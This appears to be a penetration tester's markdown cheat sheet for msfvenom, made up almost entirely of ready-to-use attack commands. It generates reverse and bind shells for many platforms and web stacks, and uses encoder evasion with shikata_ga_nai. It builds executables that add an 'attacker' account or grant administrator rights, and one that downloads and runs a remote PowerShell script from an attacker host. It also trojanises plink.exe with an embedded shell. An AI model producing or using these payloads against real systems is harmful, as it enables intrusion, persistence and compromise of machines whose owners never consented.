# MSFVenom

## Usage
- msfvenom -p \<PAYLOAD\> -e \<ENCODER\> -f \<FORMAT\> -i \<ENCODE COUNT\> LHOST=\<IP\>


## Commands
### Payloads
- msfvenom -l payloads 

### Encoders
- msfvenom -l encoders 


### Options
#### Banned characters
-b "\x00\x0a\x0d" 

#### Format
-f c 

#### Encoders
-e x86/shikata_ga_nai -i 5 

#### Inline options
- EXITFUNC=thread
- PrependSetuid=True #Use this to create a shellcode that will execute something with SUID


## Shells
### Reverse 
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe

### Bind
- msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe


## Payloads
### Add user
- msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe

### Run commands
- msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
- msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe

### Embedded 
- msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe

### Platforms
- msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
- msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
- msfvenom -p php/meterpreter_reverse_tcp LHOST=\<IP\> LPORT=\<PORT\> -f raw > shell.php
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
- msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
- msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
- msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
- msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
- msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
- msfvenom -p cmd/unix/reverse_bash LHOST=\<Local IP Address\> LPORT=\<Local Port\> -f raw > shell.sh
